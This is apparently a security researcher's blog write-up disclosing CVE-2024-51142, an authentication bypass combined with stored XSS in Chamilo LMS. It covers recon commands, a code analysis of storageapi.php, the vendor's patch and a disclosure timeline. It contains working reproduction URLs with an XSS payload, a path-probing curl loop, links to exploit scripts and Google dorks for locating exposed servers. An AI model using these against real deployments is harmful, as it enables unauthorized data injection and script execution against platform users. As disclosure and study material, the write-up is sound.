=== Content from infosecwriteups.com_dd14c838_20250114_231604.html ===
[Open in app](https://rsci.app.link/?%24canonical_url=https%3A%2F%2Fmedium.com%2Fp%2F3fcb874ac7c1&%7Efeature=LoOpenInAppButton&%7Echannel=ShowPostUnderCollection&source=---top_nav_layout_nav----------------------------------)

[Sign up](https://medium.com/m/signin?operation=register&redirect=https%3A%2F%2Finfosecwriteups.com%2Fchamilo-lms-authentication-bypass-and-cross-site-scripting-stored-3fcb874ac7c1&source=post_page---top_nav_layout_nav-----------------------global_nav-----------)

[Sign in](https://medium.com/m/signin?operation=login&redirect=https%3A%2F%2Finfosecwriteups.com%2Fchamilo-lms-authentication-bypass-and-cross-site-scripting-stored-3fcb874ac7c1&source=post_page---top_nav_layout_nav-----------------------global_nav-----------)

[Write](https://medium.com/m/signin?operation=register&redirect=https%3A%2F%2Fmedium.com%2Fnew-story&source=---top_nav_layout_nav-----------------------new_post_topnav-----------)

[Sign up](https://medium.com/m/signin?operation=register&redirect=https%3A%2F%2Finfosecwriteups.com%2Fchamilo-lms-authentication-bypass-and-cross-site-scripting-stored-3fcb874ac7c1&source=post_page---top_nav_layout_nav-----------------------global_nav-----------)

[Sign in](https://medium.com/m/signin?operation=login&redirect=https%3A%2F%2Finfosecwriteups.com%2Fchamilo-lms-authentication-bypass-and-cross-site-scripting-stored-3fcb874ac7c1&source=post_page---top_nav_layout_nav-----------------------global_nav-----------)

![](https://miro.medium.com/v2/resize:fill:64:64/1*dmbNkD5D-u45r44go_cf0g.png)
# Chamilo LMS — Unauthenticated data injection (AJAX in LP) | CVE-2024–51142

[![Miguel Méndez Z.](https://miro.medium.com/v2/resize:fill:88:88/1*Q4hN4YUHZYVEO_qiggsBWQ@2x.jpeg)](https://medium.com/%40s1kr10s?source=post_page---byline--3fcb874ac7c1--------------------------------)[![InfoSec Write-ups](https://miro.medium.com/v2/resize:fill:48:48/1*SWJxYWGZzgmBP1D0Qg_3zQ.png)](https://infosecwriteups.com/?source=post_page---byline--3fcb874ac7c1--------------------------------)

[Miguel Méndez Z.](https://medium.com/%40s1kr10s?source=post_page---byline--3fcb874ac7c1--------------------------------)

·

[Follow](https://medium.com/m/signin?actionUrl=https%3A%2F%2Fmedium.com%2F_%2Fsubscribe%2Fuser%2F691af447be50&operation=register&redirect=https%3A%2F%2Finfosecwriteups.com%2Fchamilo-lms-authentication-bypass-and-cross-site-scripting-stored-3fcb874ac7c1&user=Miguel+M%C3%A9ndez+Z.&userId=691af447be50&source=post_page-691af447be50--byline--3fcb874ac7c1---------------------post_header-----------)

Published in[InfoSec Write-ups](https://infosecwriteups.com/?source=post_page---byline--3fcb874ac7c1--------------------------------)·9 min read·Oct 27, 2024

--

Listen

Share

![]()
# Vulnerabilities in Chamilo LMS

The Chamilo LMS platform, widely used in educational environments, has been identified with an authentication bypass vulnerability that allows attackers to circumvent access control mechanisms. This vulnerability facilitates the exploitation of a second Cross-Site Scripting (XSS) vulnerability, which can have serious implications for its users. The XSS vulnerability affects Chamilo LMS versions <= 1.11.26, which is the latest available version, and enables attackers to store malicious scripts that execute in other users’ browsers, thus compromising the security and integrity of information on the platform.

# Security Issues

Chamilo 1.11.28 is a security fix release on top of 1.11.26. See security issues at <https://github.com/chamilo/chamilo-lms/wiki/security-issues#issue-175---2024-09-11---moderate-impact-moderate-risk---unauthenticated-data-injection-ajax-in-lp>

# Chamilo Exposure in Advanced and Common Search Engines

The search for the Chamilo framework using online service detection engines such as **ZoomEye**, **Shodan**, and **Censys**, as well as common search engines like **Google**, **Bing** and **Yahoo**, has revealed a significant exposure of publicly accessible servers. These results highlight a broad potential attack surface and a considerable number of possible attack vectors, underscoring the need to implement stronger security measures to protect Chamilo implementations and mitigate the risks associated with this online exposure.

![]()

Advanced Search Engines

![]()

Common Search Engines

> It’s time for a ‘hacker coffee’ and let’s get to work!

# Analysis Methodology

## Execution of StaticCodex for PHP File Analysis

We use **StaticCodex** (SAST), a proprietary tool developed in-house, designed to quickly identify vulnerable endpoints in various languages such as PHP, ASP, JSP, among others. This tool analyzes the static code for specific patterns associated with vulnerabilities such as SQL injections, XSS, RCE, and Command Injection, among others, which could represent attack vectors. In this case, the tool is executed specifically on the **.php** files of the project, focusing on the detection of critical paths that contain SQL queries.

## Extraction of Unique SQL Paths

Once **StaticCodex** generates the **output\_sql.txt** file with the paths where the **$SQL** queries are found, the results are processed to retain only the unique paths and avoid redundant analysis:

```
cat output_sql.txt | cut -d ":" -f1 | sort -u |tee -a output_sql_uniq.txt
```
## **Validation of Directory and File Existence on the Server**

Next, we proceed to validate whether the extracted paths correspond to directories and files that actually exist on the target server by sending HTTP requests to log their respective response codes. Subsequently, we exclude any paths that return a status code of 404 (not found), ensuring that only the paths that actually exist on the server are retained.

As a result, we obtain status codes 500 and 200.

```
for i in $(cat output_sql_uniq.txt); do sta=$(curl -o /dev/null -s -w "%{http_code}" "https://example.com/$i"); [ "$sta" != "404" ] && echo "$sta - $i" | tee -a output_sql_status.txt; done
```
## Analysis of Files with Status 200

With the valid files identified, we proceed to focus on those that have returned a status 200 (exist and are accessible). These will be the candidates for in-depth analysis in search of vulnerabilities.

```
cat output_sql_status.txt | grep -v "500 - " | cut -d " " -f3 | cut -d "." -f2-10
```
## Access Validation Using Burp Suite

Using **Burp Suite** (Intruder), we load the extracted paths to validate which of them require authentication or authorization to access. Those files that prevent access due to lack of permissions are excluded from the analysis, optimizing the review time and focusing on the most vulnerable ones.

We configure the path in Intruder to be automatically replaced by the list obtained in **output\_sql\_status.txt**, which contains the paths with a status code of 200.

```
GET §§ HTTP/1.1
Host: aulavirtual.friend.com
Accept-Encoding: gzip, deflate, br
Accept: */*
Accept-Language: en-US;q=0.9,en;q=0.8
User-Agent: Mozilla/5.0
Connection: close
Cache-Control: max-age=0
```

We add the list of directories and files in the payloads option, which includes a total of 320 payloads.

![]()

urls wordlist

Finally, we add a column using a regular expression to search for the string “**sufficient privileges**” which allows us to identify which of the paths can be accessed without the need to log in.

![]()

intruder result

Finally, once we have obtained the valid and accessible paths, we begin the detailed analysis of vulnerabilities, which involves a thorough review of the attack points in the selected PHP files. Applying the aforementioned methodology, we have identified critical vulnerabilities in the files **storageapi.php** and **api.lib.php**, located in **main/lp/** and **main/inc/lib/**, respectively. The **storageapi.php** file plays a fundamental role in sanitizing user inputs in **$\_REQUEST**, which is key to preventing SQL injections and ensuring the correct typing of data. During our analysis, we focused on identifying flaws that could compromise the integrity of the processed data. Below, we highlight the most relevant lines of code from the **storageapi.php** file.

## String Escaping

```
foreach (["svkey", "svvalue"] as $key) {
    $_REQUEST[$key] = Database::escape_string($_REQUEST[$key]);
}
```

The function **Database::escape\_string()** is used to escape special characters in strings, ensuring that the input data does not alter the structure of the SQL queries when inserted into a statement.

## Conversion to Integers

```
foreach (["svuser", "svcourse", "svsco", "svlength", "svasc"] as $key) {
    $_REQUEST[$key] = intval($_REQUEST[$key]);
}
```

* This conversion ensures that the values are treated as integers, converting any non-numeric value to 0.
* Type Validation: Ensures that the variables expected to be numbers are indeed numeric, preventing errors in mathematical or logical operations.

# Control Structure (Switch)

The following code snippet uses a switch control structure to handle different actions requested by the user through **$\_REQUEST**. Depending on the value of the action variable, different functions are executed.

```
switch ($_REQUEST['action']) {
    case "set":
        if (storage_can_set($_REQUEST['svuser'])) {
            echo storage_set($_REQUEST['svuser'], $_REQUEST['svcourse'], $_REQUEST['svsco'], $_REQUEST['svkey'], $_REQUEST['svvalue']);
        }
        break;
    case "getall":
        print storage_getall($_REQUEST['svuser'], $_REQUEST['svcourse'], $_REQUEST['svsco']);
        break;
    .
    . //More code here
    .
    case "usersgetall":
        print "NOT allowed, security issue, see sources";
        break;
    default:
}
```

* Function `storage_can_set()`: Checks if the user has permissions to modify the data, which is essential to ensure that only authorized users can make changes.
* Function `storage_set()`: Performs data storage in the database after verifying permissions.
* Function `storage_getall()`: Retrieves all stored values for a specific user.

# First Vulnerability — Authentication Bypass

Before analyzing the JavaScript injection vulnerability (XSS), it is essential to understand how to bypass the authentication process. The function `storage_can_set()` is designed to determine whether a user can modify data based on whether they are an administrator or if they are modifying their own data.

* Function `api_is_platform_admin()`: Checks if the user is a platform administrator, in which case they can modify the values of any user.
* Function `api_get_user_id()`: Verifies if the current user is the same as the one attempting to make the change, allowing modification if they are the same.

```
function storage_can_set($sv_user)
{
    $allowed = ((api_is_platform_admin()) || ($sv_user == api_get_user_id()));
    if (!$allowed) {
        echo "ERROR : Not allowed";
    }

    return $allowed;
}
```
![]()
# Evasion Analysis

Since we are neither administrators nor authenticated, the analysis of the **api\_get\_user\_id()** function is key. This function attempts to read the user’s session information:

```
function api_get_user_id()
{
    $userInfo = Session::read('_user');
    if ($userInfo && isset($userInfo['user_id'])) {
        return (int) $userInfo['user_id'];
    }

    return 0;
}
```

* The function attempts to retrieve the user information stored in the session using **Session::read(‘\_user’)**. The \_user variable is an array that contains the data of the authenticated user.
* It checks if **$userInfo** is not empty and if it contains the index **user\_id**.
* If both conditions are met, the value of **user\_id** is returned as an integer.
* In case there is no user information in the session or the **user\_id** index is missing, the function returns 0, indicating that no authenticated user exists.

Confirming that the function returns the ID of the authenticated user or 0 if there is no active session, when comparing **$sv\_user** with **api\_get\_user\_id()**, the function will return 0 if the user is not authenticated, which can lead to a vulnerability. If an attacker inputs a value of 0 as **$sv\_user**, the comparison will be true, allowing them to bypass authentication and modify data without the appropriate permissions. This logical error allows for the exploitation of a gap in user management, facilitating authentication bypass and the injection of malicious code, such as XSS scripts, into the Chamilo LMS platform.

# Second Vulnerability — Cross-site Scripting Injection

Now that we have understood the evasion of the implemented security measures, we can proceed to analyze the insertion of malicious code into the database, which enables the exploitation of a stored XSS vulnerability. This vulnerability can be exploited through certain code snippets, where the lack of adequate filtering allows an attacker to inject malicious scripts, which are then executed when other users view the stored data.

A clear example of how this type of vulnerability manifests is found in the **storage\_set()** function, which is responsible for storing or replacing a value (**sv\_key**) associated with a specific user.

```
function storage_set($sv_user, $sv_course, $sv_sco, $sv_key, $sv_value)
{
    $sv_value = Database::escape_string($sv_value);
    $sql = "replace into ".Database::get_main_table(TABLE_TRACK_STORED_VALUES)."
        (user_id, sco_id, course_id, sv_key, sv_value)
        values
        ('$sv_user','$sv_sco','$sv_course','$sv_key','$sv_value')";
    $res = Database::query($sql);

    return Database::affected_rows($res);
}
```
# Reproducing the Vulnerability

1) Using a web browser, we proceed to load the following specific URL, where the malicious JavaScript code will be injected.

```
https://example.com/main/lp/storageapi.php?action=set&svuser=0&svcourse=0&svcourse=0&svkey=<b/onpointerup=alert(document.domain)>Click-XSS-Here!</b>&svvalue=0
```

2) Next, the stored code injection must be verified by accessing the following URL, as illustrated in the provided image. This step is crucial to confirm that the vulnerability has been successfully exploited and that the malicious code persists in the target system.

```
https://example.com/main/lp/storageapi.php?action=getall&svuser=0&svcourse=0&svsco=0
```
![]()

real exploit

# Automating Detection with Nuclei and Python

After detailing the methodology applied during the investigation and thoroughly describing the identified vulnerability, the next step is to create a template for Nuclei that allows for easy and effective detection of the vulnerability. Additionally, an exploit has been developed in Python that not only facilitates the detection of the vulnerability but also generates the appropriate path to visualize the executed injection.

![]()

Nuclei template

> <https://github.com/s1kr10s/Exploit-Scripts/blob/main/chamilo-auth-bypass-xss.yaml>

![]()

Vulnerability and exploit scanning

> <https://github.com/s1kr10s/Exploit-Scripts/blob/main/Exploit_auth-xss.py>

# Video Proof-of-concept

# Vendor Security Patch: Auth Bypass and XSS

Security: Fix logical flaw allowing unauthenticated users to send data to a specific table

```
function storage_can_set($sv_user)
{
   // $allowed = ((api_is_platform_admin()) || ($sv_user == api_get_user_id())); ---> Before vulnerable
   $allowed = ((api_is_platform_admin()) || (!empty($sv_user) && $sv_user == api_get_user_id())); // Fix code
   if (!$allowed) {
      echo "ERROR : Not allowed";
   }
}
```

Security: Filter variables for XSS before returning in LP’s storageapi

```
function storage_get($sv_user, $sv_course, $sv_sco, $sv_key)
{
    $sql = "select sv_value
        from ".Database::get_main_table(TABLE_TRACK_STORED_VALUES)."
        where user_id= '$sv_user'
        and sco_id = '$sv_sco'
        and course_id = '$sv_course'
        and sv_key = '$sv_key'";
    $res = Database::query($sql);
    if (Database::num_rows($res) > 0) {
        $row = Database::fetch_assoc($res);
        // if (get_magic_quotes_gpc()) { ---> Before vulnerable
        //    return stripslashes($row['sv_value']); ---> Before vulnerable
        // }
        return Security::remove_XSS($row['sv_value']); // Fix code
    } else {
        return null;
    }
}
```
# Advisory Timeline

* September 11, 2024: Initial Contact with the Vendor
* September 20, 2024: Vendor Confirms Vulnerabilities
* September 20, 2024: Vendor Patch (Commit: [Auth Bypass](https://github.com/chamilo/chamilo-lms/commit/58c54f4631d461a3091cffc919a1701387f7c192) and [XSS](https://github.com/chamilo/chamilo-lms/commit/d30adc7bcf0b42c1c02bb9991ccfbb94dc26921e))
* September 21, 2024: Request for CVE ID Submitted
* October 21, 2024: Advisory Released by the Vendor ([v1.11.28](https://github.com/chamilo/chamilo-lms/releases/latest))
* November 13, 2024: CVE-2024–51142 Assigned

# Some Google Dork

> inurl:“/main/auth/lostPassword.php” site:\*
>
> inurl:“index.php?language=spanish” site:\*
>
> intext:“Powered by Chamilo” site:\*
>
> inurl:”main/auth/inscription.php” site:\*
>
> inurl:”main/auth/inscription.php” site:\*

Bye, see you soon…

[Exploit](https://medium.com/tag/exploit?source=post_page-----3fcb874ac7c1--------------------------------)[Reversing](https://medium.com/tag/reversing?source=post_page-----3fcb874ac7c1--------------------------------)[Vulnerability](https://medium.com/tag/vulnerability?source=post_page-----3fcb874ac7c1--------------------------------)[Research](https://medium.com/tag/research?source=post_page-----3fcb874ac7c1--------------------------------)[Pentesting](https://medium.com/tag/pentesting?source=post_page-----3fcb874ac7c1--------------------------------)

--

--

[![InfoSec Write-ups](https://miro.medium.com/v2/resize:fill:96:96/1*SWJxYWGZzgmBP1D0Qg_3zQ.png)](https://infosecwriteups.com/?source=post_page---post_publication_info--3fcb874ac7c1--------------------------------)[![InfoSec Write-ups](https://miro.medium.com/v2/resize:fill:128:128/1*SWJxYWGZzgmBP1D0Qg_3zQ.png)](https://infosecwriteups.com/?source=post_page---post_publication_info--3fcb874ac7c1--------------------------------)[## Published in InfoSec Write-ups](https://infosecwriteups.com/?source=post_page---post_publication_info--3fcb874ac7c1--------------------------------)[50K Followers](/followers?source=post_page---post_publication_info--3fcb874ac7c1--------------------------------)·[Last published 1 day ago](/bypassing-endpoint-detection-and-response-edr-solutions-practical-evasion-techniques-with-fc041ad65d0b?source=post_page---post_publication_info--3fcb874ac7c1--------------------------------)

A collection of write-ups from the best hackers in the world on topics ranging from bug bounties and CTFs to vulnhub machines, hardware challenges and real life encounters. Subscribe to our weekly newsletter for the coolest infosec updates: <https://weekly.infosecwriteups.com/>

[![Miguel Méndez Z.](https://miro.medium.com/v2/resize:fill:96:96/1*Q4hN4YUHZYVEO_qiggsBWQ@2x.jpeg)](https://medium.com/%40s1kr10s?source=post_page---post_author_info--3fcb874ac7c1--------------------------------)[![Miguel Méndez Z.](https://miro.medium.com/v2/resize:fill:128:128/1*Q4hN4YUHZYVEO_qiggsBWQ@2x.jpeg)](https://medium.com/%40s1kr10s?source=post_page---post_author_info--3fcb874ac7c1--------------------------------)[Follow](https://medium.com/m/signin?actionUrl=https%3A%2F%2Fmedium.com%2F_%2Fsubscribe%2Fuser%2F691af447be50&operation=register&redirect=https%3A%2F%2Finfosecwriteups.com%2Fchamilo-lms-authentication-bypass-and-cross-site-scripting-stored-3fcb874ac7c1&user=Miguel+M%C3%A9ndez+Z.&userId=691af447be50&source=post_page-691af447be50--post_author_info--3fcb874ac7c1---------------------follow_profile-----------)[## Written by Miguel Méndez Z.](https://medium.com/%40s1kr10s?source=post_page---post_author_info--3fcb874ac7c1--------------------------------)[142 Followers](https://medium.com/%40s1kr10s/followers?source=post_page---post_author_info--3fcb874ac7c1--------------------------------)·[45 Following](https://medium.com/%40s1kr10s/following?source=post_page---post_author_info--3fcb874ac7c1--------------------------------)

<https://s1kr10s.github.io/whoami.html> — @s1kr10s

[Follow](https://medium.com/m/signin?actionUrl=https%3A%2F%2Fmedium.com%2F_%2Fsubscribe%2Fuser%2F691af447be50&operation=register&redirect=https%3A%2F%2Finfosecwriteups.com%2Fchamilo-lms-authentication-bypass-and-cross-site-scripting-stored-3fcb874ac7c1&user=Miguel+M%C3%A9ndez+Z.&userId=691af447be50&source=post_page-691af447be50--post_author_info--3fcb874ac7c1---------------------follow_profile-----------)
## No responses yet

[Help](https://help.medium.com/hc/en-us?source=post_page-----3fcb874ac7c1--------------------------------)[Status](https://medium.statuspage.io/?source=post_page-----3fcb874ac7c1--------------------------------)[About](https://medium.com/about?autoplay=1&source=post_page-----3fcb874ac7c1--------------------------------)[Careers](https://medium.com/jobs-at-medium/work-at-medium-959d1a85284e?source=post_page-----3fcb874ac7c1--------------------------------)[Press](pressinquiries%40medium.com?source=post_page-----3fcb874ac7c1--------------------------------)[Blog](https://blog.medium.com/?source=post_page-----3fcb874ac7c1--------------------------------)[Privacy](https://policy.medium.com/medium-privacy-policy-f03bf92035c9?source=post_page-----3fcb874ac7c1--------------------------------)[Terms](https://policy.medium.com/medium-terms-of-service-9db0094a1e0f?source=post_page-----3fcb874ac7c1--------------------------------)[Text to speech](https://speechify.com/medium?source=post_page-----3fcb874ac7c1--------------------------------)[Teams](https://medium.com/business?source=post_page-----3fcb874ac7c1--------------------------------)


